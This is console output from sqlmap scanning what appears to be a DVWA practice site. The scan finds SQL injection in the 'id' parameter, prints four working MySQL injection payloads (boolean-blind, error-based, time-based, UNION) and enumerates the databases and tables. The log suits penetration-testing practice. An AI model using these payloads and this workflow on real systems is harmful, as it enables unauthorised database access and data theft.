        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.8.3#stable}
|_ -| . [)]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 13:31:11 /2024-04-26/

do you want to check for the existence of site's sitemap(.xml) [y/N] N
[13:31:11] [INFO] starting crawler for target URL 'https://pentest-ground.com:4280'
[13:31:11] [INFO] searching for links with depth 1
[13:31:11] [INFO] searching for links with depth 2
please enter number of threads? [Enter for 1 (current)] 1
[13:31:11] [WARNING] running in a single-thread mode. This could take a while
got a 302 redirect to 'https://pentest-ground.com:4280/login.php'. Do you want to follow? [Y/n] Y
[13:31:18] [WARNING] potential CAPTCHA protection mechanism detected
do you want to normalize crawling results [Y/n] Y
do you want to store crawling results to a temporary file for eventual further processing with other tools [y/N] N
[13:31:21] [INFO] found a total of 16 targets
[1/16] Form:
POST https://pentest-ground.com:4280/vulnerabilities/javascript/
POST data: token=&phrase=ChangeMe&send=Submit
do you want to test this form? [Y/n/q] 
> Y
Edit POST data [default: token=&phrase=ChangeMe&send=Submit] (Warning: blank fields detected): token=&phrase=ChangeMe&send=Submit
do you want to fill blank fields with random values? [Y/n] Y
POST parameter 'token' appears to hold anti-CSRF token. Do you want sqlmap to automatically update it in further requests? [y/N] N
[13:31:21] [INFO] using '/Users/mahdihussnie/.local/share/sqlmap/output/results-04262024_0131pm.csv' as the CSV results file in multiple targets mode
you have not declared cookie(s), while server wants to set its own ('security=low;PHPSESSID=9e9931320b4...72cc9c6cbf'). Do you want to use those [Y/n] Y
[13:31:22] [INFO] checking if the target is protected by some kind of WAF/IPS
[13:31:22] [INFO] testing if the target URL content is stable
[13:31:22] [INFO] target URL content is stable
[13:31:22] [INFO] ignoring POST parameter 'token'
[13:31:22] [INFO] testing if POST parameter 'phrase' is dynamic
[13:31:23] [WARNING] POST parameter 'phrase' does not appear to be dynamic
[13:31:23] [WARNING] heuristic (basic) test shows that POST parameter 'phrase' might not be injectable
[13:31:24] [INFO] testing for SQL injection on POST parameter 'phrase'
[13:31:24] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[13:31:26] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[13:31:26] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[13:31:28] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[13:31:29] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[13:31:31] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[13:31:32] [INFO] testing 'Generic inline queries'
[13:31:33] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[13:31:34] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[13:31:35] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[13:31:36] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[13:31:38] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
[13:31:40] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
[13:31:41] [INFO] testing 'Oracle AND time-based blind'
it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
[13:31:43] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[13:31:48] [WARNING] POST parameter 'phrase' does not seem to be injectable
[13:31:48] [INFO] testing if POST parameter 'send' is dynamic
[13:31:49] [WARNING] POST parameter 'send' does not appear to be dynamic
[13:31:49] [WARNING] heuristic (basic) test shows that POST parameter 'send' might not be injectable
[13:31:49] [INFO] testing for SQL injection on POST parameter 'send'
[13:31:49] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[13:31:52] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[13:31:53] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[13:31:55] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[13:31:56] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[13:31:59] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[13:32:00] [INFO] testing 'Generic inline queries'
[13:32:01] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[13:32:02] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[13:32:03] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[13:32:05] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[13:32:06] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
[13:32:08] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
[13:32:09] [INFO] testing 'Oracle AND time-based blind'
[13:32:11] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[13:32:14] [WARNING] POST parameter 'send' does not seem to be injectable
[13:32:14] [ERROR] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent', skipping to the next target
[2/16] Form:
GET https://pentest-ground.com:4280/vulnerabilities/sqli/?id=&Submit=Submit
do you want to test this form? [Y/n/q] 
> Y
Edit GET data [default: id=&Submit=Submit]: id=&Submit=Submit
do you want to fill blank fields with random values? [Y/n] Y
you have not declared cookie(s), while server wants to set its own ('security=low;PHPSESSID=cc399f68529...15240ec9e6'). Do you want to use those [Y/n] Y
[13:32:15] [INFO] testing if the target URL content is stable
[13:32:15] [INFO] target URL content is stable
[13:32:15] [INFO] testing if GET parameter 'id' is dynamic
[13:32:16] [WARNING] GET parameter 'id' does not appear to be dynamic
[13:32:16] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')
[13:32:16] [INFO] testing for SQL injection on GET parameter 'id'
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
[13:32:16] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[13:32:19] [WARNING] reflective value(s) found and filtering out
[13:32:20] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[13:32:20] [INFO] testing 'Generic inline queries'
[13:32:21] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[13:32:35] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[13:32:49] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
[13:32:56] [INFO] GET parameter 'id' appears to be 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)' injectable (with --not-string="Me")
[13:32:56] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[13:32:56] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[13:32:57] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[13:32:57] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[13:32:57] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
[13:32:58] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'
[13:32:58] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
[13:32:58] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
[13:32:59] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[13:32:59] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[13:32:59] [INFO] GET parameter 'id' is 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' injectable 
[13:32:59] [INFO] testing 'MySQL inline queries'
[13:33:00] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[13:33:00] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[13:33:00] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[13:33:01] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[13:33:01] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
[13:33:01] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
[13:33:02] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[13:33:18] [INFO] GET parameter 'id' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
[13:33:18] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[13:33:18] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'
[13:33:18] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[13:33:19] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[13:33:21] [INFO] target URL appears to have 2 columns in query
[13:33:22] [INFO] GET parameter 'id' is 'MySQL UNION query (NULL) - 1 to 20 columns' injectable
[13:33:22] [WARNING] in OR boolean-based injection cases, please consider usage of switch '--drop-set-cookie' if you experience any problems during data retrieval
GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 152 HTTP(s) requests:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
    Payload: id=1829' OR NOT 8711=8711#&Submit=Submit

    Type: error-based
    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: id=1829' OR (SELECT 9773 FROM(SELECT COUNT(*),CONCAT(0x717a786271,(SELECT (ELT(9773=9773,1))),0x716a767871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- JQMT&Submit=Submit

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1829' AND (SELECT 9395 FROM (SELECT(SLEEP(5)))Jmou)-- YdyC&Submit=Submit

    Type: UNION query
    Title: MySQL UNION query (NULL) - 2 columns
    Payload: id=1829' UNION ALL SELECT CONCAT(0x717a786271,0x7745457366546c49754e65725861705265727357564a744274427858656954734e41555746757356,0x716a767871),NULL#&Submit=Submit
---
do you want to exploit this SQL injection? [Y/n] Y
[13:33:22] [INFO] the back-end DBMS is MySQL
web application technology: PHP 8.3.6, Nginx 1.25.5
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
[13:33:22] [INFO] fetching database names
available databases [2]:
[*] dvwa
[*] information_schema

[13:33:23] [INFO] fetching tables for databases: 'dvwa, information_schema'
Database: information_schema
[79 tables]
+---------------------------------------+
| ALL_PLUGINS                           |
| APPLICABLE_ROLES                      |
| CHARACTER_SETS                        |
| CHECK_CONSTRAINTS                     |
| CLIENT_STATISTICS                     |
| COLLATIONS                            |
| COLLATION_CHARACTER_SET_APPLICABILITY |
| COLUMN_PRIVILEGES                     |
| ENABLED_ROLES                         |
| FILES                                 |
| GEOMETRY_COLUMNS                      |
| GLOBAL_STATUS                         |
| GLOBAL_VARIABLES                      |
| INDEX_STATISTICS                      |
| INNODB_BUFFER_PAGE                    |
| INNODB_BUFFER_PAGE_LRU                |
| INNODB_BUFFER_POOL_STATS              |
| INNODB_CMP                            |
| INNODB_CMPMEM                         |
| INNODB_CMPMEM_RESET                   |
| INNODB_CMP_PER_INDEX                  |
| INNODB_CMP_PER_INDEX_RESET            |
| INNODB_CMP_RESET                      |
| INNODB_FT_BEING_DELETED               |
| INNODB_FT_CONFIG                      |
| INNODB_FT_DEFAULT_STOPWORD            |
| INNODB_FT_DELETED                     |
| INNODB_FT_INDEX_CACHE                 |
| INNODB_FT_INDEX_TABLE                 |
| INNODB_LOCKS                          |
| INNODB_LOCK_WAITS                     |
| INNODB_METRICS                        |
| INNODB_SYS_COLUMNS                    |
| INNODB_SYS_FIELDS                     |
| INNODB_SYS_FOREIGN                    |
| INNODB_SYS_FOREIGN_COLS               |
| INNODB_SYS_INDEXES                    |
| INNODB_SYS_TABLES                     |
| INNODB_SYS_TABLESPACES                |
| INNODB_SYS_TABLESTATS                 |
| INNODB_SYS_VIRTUAL                    |
| INNODB_TABLESPACES_ENCRYPTION         |
| INNODB_TRX                            |
| KEYWORDS                              |
| KEY_CACHES                            |
| KEY_COLUMN_USAGE                      |
| OPTIMIZER_TRACE                       |
| PARAMETERS                            |
| PROFILING                             |
| REFERENTIAL_CONSTRAINTS               |
| ROUTINES                              |
| SCHEMATA                              |
| SCHEMA_PRIVILEGES                     |
| SESSION_STATUS                        |
| SESSION_VARIABLES                     |
| SPATIAL_REF_SYS                       |
| SQL_FUNCTIONS                         |
| STATISTICS                            |
| SYSTEM_VARIABLES                      |
| TABLESPACES                           |
| TABLE_CONSTRAINTS                     |
| TABLE_PRIVILEGES                      |
| TABLE_STATISTICS                      |
| THREAD_POOL_GROUPS                    |
| THREAD_POOL_QUEUES                    |
| THREAD_POOL_STATS                     |
| THREAD_POOL_WAITS                     |
| USER_PRIVILEGES                       |
| USER_STATISTICS                       |
| VIEWS                                 |
| COLUMNS                               |
| ENGINES                               |
| EVENTS                                |
| PARTITIONS                            |
| PLUGINS                               |
| PROCESSLIST                           |
| TABLES                                |
| TRIGGERS                              |
| user_variables                        |
+---------------------------------------+

Database: dvwa
[2 tables]
+---------------------------------------+
| guestbook                             |
| users                                 |
+---------------------------------------+

[13:33:23] [WARNING] HTTP error codes detected during run:
504 (Gateway Timeout) - 2 times
SQL injection vulnerability has already been detected against 'pentest-ground.com'. Do you want to skip further tests involving it? [Y/n] Y
[13:33:23] [INFO] skipping 'https://pentest-ground.com:4280/vulnerabilities/brute/?username=&password=&Login=Login'
[13:33:23] [INFO] skipping 'https://pentest-ground.com:4280/vulnerabilities/xss_r/?name='
[13:33:23] [INFO] skipping 'https://pentest-ground.com:4280/vulnerabilities/csp/'
[13:33:23] [INFO] skipping 'https://pentest-ground.com:4280/login.php'
[13:33:23] [INFO] skipping 'https://pentest-ground.com:4280/security.php'
[13:33:23] [INFO] skipping 'https://pentest-ground.com:4280/setup.php'
[13:33:23] [INFO] skipping 'https://pentest-ground.com:4280/vulnerabilities/captcha/'
[13:33:23] [INFO] skipping 'https://pentest-ground.com:4280/vulnerabilities/exec/'
[13:33:23] [INFO] skipping 'https://pentest-ground.com:4280/vulnerabilities/csrf/?password_new=&password_conf=&Change=Change'
[13:33:23] [INFO] skipping 'https://pentest-ground.com:4280/vulnerabilities/xss_s/'
[13:33:23] [INFO] skipping 'https://pentest-ground.com:4280/vulnerabilities/xss_d/?default=" %2B lang %2B "'
[13:33:23] [INFO] skipping 'https://pentest-ground.com:4280/vulnerabilities/fi/?page=include.php'
[13:33:23] [INFO] skipping 'https://pentest-ground.com:4280/instructions.php?doc=readme'
[13:33:23] [INFO] skipping 'https://pentest-ground.com:4280/vulnerabilities/open_redirect/source/low.php?redirect=info.php?id=1'
[13:33:23] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/Users/mahdihussnie/.local/share/sqlmap/output/results-04262024_0131pm.csv'

[*] ending @ 13:33:23 /2024-04-26/

